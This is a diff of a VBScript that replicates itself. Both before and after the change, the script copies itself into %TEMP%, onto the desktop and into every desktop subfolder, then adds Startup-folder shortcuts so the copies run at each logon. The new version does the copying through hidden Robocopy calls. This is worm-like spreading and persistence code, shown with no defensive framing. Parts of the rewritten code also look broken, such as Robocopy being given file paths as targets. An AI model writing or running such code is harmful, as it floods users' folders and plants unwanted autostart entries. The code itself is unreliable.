@@ -1,45 +1,40 @@
-Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
 strScriptPath = WScript.ScriptFullName
 
 ' Specify the number of copies you want to create
 numCopies = 5
 
 For i = 1 To numCopies
-    strCopyPath = objFSO.GetParentFolderName(strScriptPath) & "\Copy" & i & ".vbs"
-    objFSO.CopyFile strScriptPath, strCopyPath, True ' Add "True" to overwrite existing files
+    strCopyPath = objShell.ExpandEnvironmentStrings("%TEMP%") & "\Copy" & i & ".vbs"
+    objShell.Run "Robocopy /COPYALL /E /IS """ & objShell.CurrentDirectory & """ """ & strCopyPath & """", 0, True
     
     ' Get the path to the desktop folder
-    strDesktopFolder = objFSO.GetSpecialFolder(0) ' 0 represents the Desktop folder
+    strDesktopFolder = objShell.SpecialFolders("Desktop")
     
     ' Create a copy of the script on the desktop
     strDesktopCopyPath = strDesktopFolder & "\Copy" & i & ".vbs"
-    CopyFileWithFSO strCopyPath, strDesktopCopyPath
+    objShell.Run "Robocopy /COPYALL /IS """ & strCopyPath & """ """ & strDesktopCopyPath & """", 0, True
     
     ' Get the list of folders on the desktop
-    Set objDesktopFolder = objFSO.GetFolder(strDesktopFolder)
-    Set colFolders = objDesktopFolder.SubFolders
+    Set objDesktopFolder = objShell.Namespace(strDesktopFolder)
+    Set colFolders = objDesktopFolder.Items
     
     ' Iterate through each folder and create a copy of the script
     For Each objFolder In colFolders
         strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
-        CopyFileWithFSO strCopyPath, strFolderCopyPath
+        objShell.Run "Robocopy /COPYALL /IS """ & strCopyPath & """ """ & strFolderCopyPath & """", 0, True
     Next
     
     ' Get the path to the startup folder
-    strStartupFolder = objFSO.GetSpecialFolder(2) ' 2 represents the Startup folder
+    strStartupFolder = objShell.SpecialFolders("Startup")
     
     ' Create a shortcut to the copied script in the startup folder for each folder on the desktop
     For Each objFolder In colFolders
         strFolderCopyPath = objFolder.Path & "\Copy" & i & ".vbs"
-        strFolderShortcutPath = strStartupFolder & "\Copy" & i & "_" & objFSO.GetBaseName(objFolder) & ".lnk"
+        strFolderShortcutPath = strStartupFolder & "\Copy" & i & "_" & objFolder.Name & ".lnk"
         
-        Set objShell = CreateObject("WScript.Shell")
         Set objShortcut = objShell.CreateShortcut(strFolderShortcutPath)
         objShortcut.TargetPath = strFolderCopyPath
         objShortcut.Save
     Next
 Next
-
-Sub CopyFileWithFSO(sourcePath, destinationPath)
-    objFSO.CopyFile sourcePath, destinationPath, True ' Add "True" to overwrite existing files
-End Sub
